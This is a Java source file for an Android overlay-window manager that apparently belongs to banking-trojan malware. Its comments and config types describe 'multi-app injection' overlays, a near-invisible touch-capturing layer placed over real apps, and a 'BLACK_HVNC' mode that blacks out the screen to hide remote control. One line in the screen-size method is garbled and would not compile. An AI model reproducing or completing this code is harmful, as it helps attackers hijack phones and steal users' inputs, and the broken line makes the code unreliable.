package com.fason.app.features.springe.delivery;

import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.os.Build;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.locks.ReentrantLock;

/**
 * OverlayWindowManager — Manages TYPE_APPLICATION_OVERLAY windows.
 *
 * Handles:
 * - Creating and destroying overlay windows
 * - Window parameter configuration (position, size, touch interceptor)
 * - Multiple overlay Z-ordering (for simultaneous multi-app injection)
 * - Permission checking (SYSTEM_ALERT_WINDOW)
 * - Android API level differences
 *
 * Thread-safe: all window operations are synchronized via a reentrant lock
 * to prevent concurrent addView/removeView crashes.
 */
public final class OverlayWindowManager {

    private static final String TAG = "OverlayWindowManager";

    private final Context context;
    private final WindowManager windowManager;
    private final ReentrantLock lock = new ReentrantLock();

    // Track all active overlay views and their IDs
    private final Set<View> activeViews = new HashSet<>();
    private volatile View topmostView = null;

    // Screen dimensions cached for layout
    private int screenWidth;
    private int screenHeight;

    public OverlayWindowManager(Context context) {
        this.context = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        calculateScreenSize();
    }

    private void calculateScreenSize() {
        try {
            Point size = new Point();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                windowManager.getCurrentWindowMetrics().getBounds().toShortString()
                    new java.io.PrintWriter(System.out), null, null);
                android.graphics.Rect bounds = windowManager.getCurrentWindowMetrics().getBounds();
                screenWidth = bounds.width();
                screenHeight = bounds.height();
            } else {
                windowManager.getDefaultDisplay().getSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
            }
        } catch (Exception e) {
            screenWidth = 1080;
            screenHeight = 1920;
        }
    }

    public int getScreenWidth() { return screenWidth; }
    public int getScreenHeight() { return screenHeight; }

    /**
     * Create and add a new overlay window for the given view.
     * Returns the WindowManager.LayoutParams used, or null on failure.
     */
    public WindowManager.LayoutParams addOverlay(View view, OverlayConfig config) {
        if (view == null) return null;

        lock.lock();
        try {
            WindowManager.LayoutParams params = buildParams(config);
            windowManager.addView(view, params);
            activeViews.add(view);
            topmostView = view;
            Log.d(TAG, "Overlay added: type=" + config.type
                + ", w=" + params.width + ", h=" + params.height
                + ", x=" + params.x + ", y=" + params.y);
            return params;
        } catch (Exception e) {
            Log.e(TAG, "Failed to add overlay", e);
            return null;
        } finally {
            lock.unlock();
        }
    }

    /**
     * Update an existing overlay's layout parameters.
     */
    public void updateOverlay(View view, WindowManager.LayoutParams params) {
        if (view == null || params == null) return;

        try {
            windowManager.updateViewLayout(view, params);
        } catch (Exception e) {
            Log.e(TAG, "Failed to update overlay", e);
        }
    }

    /**
     * Remove a specific overlay view.
     */
    public void removeOverlay(View view) {
        if (view == null) return;

        lock.lock();
        try {
            windowManager.removeView(view);
            activeViews.remove(view);
            if (view == topmostView) {
                topmostView = null;
            }
            Log.d(TAG, "Overlay removed. Active: " + activeViews.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to remove overlay", e);
        } finally {
            lock.unlock();
        }
    }

    /**
     * Remove ALL overlay views. Called during disarm or shutdown.
     */
    public void removeAll() {
        lock.lock();
        try {
            for (View view : new HashSet<>(activeViews)) {
                try {
                    windowManager.removeView(view);
                } catch (Exception ignored) {}
            }
            activeViews.clear();
            topmostView = null;
            Log.d(TAG, "All overlays removed");
        } finally {
            lock.unlock();
        }
    }

    public int getActiveCount() { return activeViews.size(); }

    /**
     * Build WindowManager.LayoutParams from an OverlayConfig.
     *
     * CRITICAL: Uses TYPE_APPLICATION_OVERLAY (API 26+) which is the only
     * allowed overlay type for SYSTEM_ALERT_WINDOW permission on modern Android.
     */
    private WindowManager.LayoutParams buildParams(OverlayConfig config) {
        int flags;

        switch (config.type) {
            case OverlayConfig.TYPE_FULLSCREEN:
                flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
                if (config.blocking) {
                    flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                }
                break;

            case OverlayConfig.TYPE_INVISIBLE_CAPTURE:
                // Captures touches but user sees real app behind it
                flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_SPLIT_TOUCH;
                break;

            case OverlayConfig.TYPE_BLACK_HVNC:
                flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                break;

            default:
                flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        }

        int windowType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            windowType = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            config.width > 0 ? config.width : WindowManager.LayoutParams.MATCH_PARENT,
            config.height > 0 ? config.height : WindowManager.LayoutParams.MATCH_PARENT,
            windowType,
            flags,
            PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.LEFT;
        params.x = config.x;
        params.y = config.y;

        if (config.alpha < 1.0f) {
            params.alpha = config.alpha;
        }

        if (config.dimAmount > 0) {
            params.dimAmount = config.dimAmount;
            params.flags |= WindowManager.LayoutParams.FLAG_DIM_BEHIND;
        }

        // Remove title from window
        params.setTitle("");

        return params;
    }

    /**
     * Configuration for a single overlay window.
     */
    public static final class OverlayConfig {
        public static final int TYPE_FULLSCREEN = 0;
        public static final int TYPE_INVISIBLE_CAPTURE = 1;
        public static final int TYPE_BLACK_HVNC = 2;

        public final int type;
        public int x = 0;
        public int y = 0;
        public int width = -1;  // -1 = MATCH_PARENT
        public int height = -1; // -1 = MATCH_PARENT
        public float alpha = 1.0f;
        public float dimAmount = 0;
        public boolean blocking = true;

        public OverlayConfig(int type) {
            this.type = type;
        }

        public static OverlayConfig fullscreen() {
            return new OverlayConfig(TYPE_FULLSCREEN);
        }

        public static OverlayConfig invisibleCapture() {
            OverlayConfig config = new OverlayConfig(TYPE_INVISIBLE_CAPTURE);
            config.alpha = 0.01f;
            return config;
        }

        public static OverlayConfig blackHvnc() {
            OverlayConfig config = new OverlayConfig(TYPE_BLACK_HVNC);
            config.dimAmount = 1.0f;
            return config;
        }
    }
}
